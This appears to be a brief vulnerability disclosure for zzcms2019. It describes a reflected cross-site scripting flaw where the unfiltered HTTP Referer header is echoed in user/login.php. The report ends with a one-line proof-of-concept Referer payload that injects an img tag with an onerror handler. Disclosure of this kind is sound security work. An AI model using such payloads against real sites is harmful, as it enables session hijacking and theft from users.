
* version: zzcms2019
* referer: http://www.zzcms.net/about/6.htm
* issue: xss

## Position

in `zzcms2019/user/login.php line 24`：

![zzcms2019_xss_1](https://github.com/iohex/ZZCMS/blob/master/zzcms2019_xss_1.png)

The `@$_SERVER['HTTP_REFERER']` can be controlled by the Referer header, and it doesn't be filtered in `zzcms2019/inc/stopsqlin.php`:

![zzcms2019_xss_2](https://github.com/iohex/ZZCMS/blob/master/zzcms2019_xss_2.png)



## PoC

`Referer: xss"/><img src="#" onerror="alert(1)"/>`

![zzcms2019_xss_3](https://github.com/iohex/ZZCMS/blob/master/zzcms2019_xss_3.png)
